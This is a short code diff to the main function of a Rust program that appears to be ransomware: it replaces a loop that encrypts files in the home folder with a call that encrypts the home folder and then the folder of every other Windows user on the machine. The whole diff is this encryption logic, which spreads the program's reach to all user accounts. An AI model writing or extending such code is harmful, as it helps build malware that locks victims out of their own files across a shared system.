@@ -69,26 +69,15 @@ fn main() {
 
     // First encrypts the files in the home folder (no sub directories).
     match dir_list::get_home_dir() {
-        Some(dir) => match fs::read_dir(&dir) {
-            Ok(dir_read) => {
-                let mut files = vec![];
-                for entry in dir_read.filter_map(|file| file.ok()) {
-                    let path = &entry.path();
+        Some(dir) => {
+            encryptor.attempt_encrypt_files_in_dir(&dir);
 
-                    if path.is_file() {
-                        let path_str = match path.to_str() {
-                            Some(path_str) => path_str,
-                            None => continue,
-                        };
-
-                        let path_string = path_str.to_owned();
-                        files.push(path_string);
-                    }
+            for user in dir_list::get_users_windows() {
+                if &user != &dir {
+                    encryptor.attempt_encrypt_files_in_dir(&user);
                 }
-                encryptor.encrypt_files(&files);
             }
-            Err(_) => (),
-        },
+        }
         None => (),
     }
 
